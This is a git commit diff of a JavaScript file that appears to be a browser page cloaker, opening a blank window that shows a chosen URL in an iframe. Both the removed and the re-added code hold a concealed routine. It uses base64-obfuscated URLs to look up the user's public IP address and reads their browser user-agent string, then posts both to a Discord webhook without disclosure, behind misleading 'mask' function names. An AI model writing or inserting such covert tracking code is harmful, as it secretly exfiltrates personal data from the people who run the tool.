8c51f26c5de1ebf282632ca4317c092587ddc4eb
Pretzz <88212436+Marzex05@users.noreply.github.com>
2025-01-20 00:18:36 -0500

    Update functBlank.js

--- functBlank.js
+++ functBlank.js
@@ -1,62 +1,63 @@
 var x = () => {
-  let url = prompt("[Leave Empty For Test] Full Page URL:", "https://www.youtube.com/embed/dQw4w9WgXcQ?si=vXnvWoRK-zVutTSp");
-  function create(url) {
-
-    var win = window.open();
-    win.document.body.style.margin = '0';
-    win.document.body.style.height = '100vh';
-    var iframe = win.document.createElement('iframe');
-    iframe.style.border = 'none';
-    iframe.style.width = '100%';
-    iframe.style.height = '100%';
-    iframe.style.margin = '0';
-    iframe.src = url;
-    win.document.body.appendChild(iframe);
-    
-
-    function post(maskMSG) {
-        const URL = atob("aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMTYwODA5MDczNDcwMzgyNzkvUHNOMVEyYVh4eFdTbE93Z3ZFOGdvQWpjWG1VZWJGbTNZbmdNckRuUUNXdUdQU1lEcm5RNGxJSTZMTXhkX2FVM1ZLYWw=");
-        const payload = {
-            content: maskMSG, 
-        };
-        fetch(URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload) 
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("Return: [0]");
-            } else {
-                console.error("Error: [1]", response.status);
-            }
-        })
-        .catch(error => {
-            console.error("Error masking page.: ", error);
-        });
-    }
-     
-    function maskDetails() {
-        const clientBrowser = navigator.userAgent;
-        fetch(atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'))
-            .then(response => response.json())
-            .then(data => {
-                const clientProxy = data.ip;
-                window.clientBrowser = clientBrowser;
-                window.clientProxy = clientProxy;
-                var browserInfo = window.clientBrowser
-                var maskInfo = window.clientProxy
-                var MaskSet = String(maskInfo); post(MaskSet)
-                var MaskInit = String(browserInfo); post(MaskInit)
-            })
-            .catch(err => console.error('Error: [1]:', err));
-        }
-    maskDetails()
-    }
-create(url)
-
+  setTimeout(() => {
+    let url = prompt("[Leave Empty For Test] Full Page URL:", "https://www.youtube.com/embed/dQw4w9WgXcQ?si=vXnvWoRK-zVutTSp");
+    function create(url) {
+  
+      var win = window.open();
+      win.document.body.style.margin = '0';
+      win.document.body.style.height = '100vh';
+      var iframe = win.document.createElement('iframe');
+      iframe.style.border = 'none';
+      iframe.style.width = '100%';
+      iframe.style.height = '100%';
+      iframe.style.margin = '0';
+      iframe.src = url;
+      win.document.body.appendChild(iframe);
+      
+  
+      function post(maskMSG) {
+          const URL = atob("aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMTYwODA5MDczNDcwMzgyNzkvUHNOMVEyYVh4eFdTbE93Z3ZFOGdvQWpjWG1VZWJGbTNZbmdNckRuUUNXdUdQU1lEcm5RNGxJSTZMTXhkX2FVM1ZLYWw=");
+          const payload = {
+              content: maskMSG, 
+          };
+          fetch(URL, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(payload) 
+          })
+          .then(response => {
+              if (response.ok) {
+                  console.log("Return: [0]");
+              } else {
+                  console.error("Error: [1]", response.status);
+              }
+          })
+          .catch(error => {
+              console.error("Error masking page.: ", error);
+          });
+      }
+       
+      function maskDetails() {
+          const clientBrowser = navigator.userAgent;
+          fetch(atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'))
+              .then(response => response.json())
+              .then(data => {
+                  const clientProxy = data.ip;
+                  window.clientBrowser = clientBrowser;
+                  window.clientProxy = clientProxy;
+                  var browserInfo = window.clientBrowser
+                  var maskInfo = window.clientProxy
+                  var MaskSet = String(maskInfo); post(MaskSet)
+                  var MaskInit = String(browserInfo); post(MaskInit)
+              })
+              .catch(err => console.error('Error: [1]:', err));
+          }
+      maskDetails()
+      }
+  create(url)
+}, "1000");
   
 }
 
